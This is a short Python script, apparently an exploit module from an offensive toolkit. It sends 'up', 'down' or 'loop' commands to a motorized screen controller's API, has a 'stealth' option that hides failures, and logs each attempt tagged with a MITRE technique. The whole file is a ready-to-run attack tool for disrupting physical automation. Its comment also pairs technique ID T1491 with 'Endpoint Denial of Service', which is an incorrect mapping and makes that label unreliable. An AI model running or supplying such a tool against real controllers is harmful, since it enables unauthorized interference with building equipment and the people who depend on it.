# modules/exploits/screen_override.py

import argparse
import requests
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1491"  # Endpoint Denial of Service (physical automation disruption)

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    data = []
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def control_screen(endpoint, command, stealth):
    try:
        r = requests.post(endpoint, json={"command": command}, timeout=5)
        if r.status_code == 200:
            print(f"[âœ“] Command '{command}' sent to {endpoint}")
        elif not stealth:
            print(f"[!] Response: {r.status_code} - {r.text}")

        log_event({
            "timestamp": datetime.utcnow().isoformat(),
            "endpoint": endpoint,
            "command": command,
            "ttp": MITRE_TTP,
            "success": r.status_code == 200
        })

    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Motorized Screen Override")
    parser.add_argument("--endpoint", required=True, help="Screen controller API URL")
    parser.add_argument("--command", choices=["up", "down", "loop"], required=True)
    parser.add_argument("--stealth", action="store_true", help="Suppress output if failure")
    args = parser.parse_args()

    control_screen(args.endpoint, args.command, args.stealth)
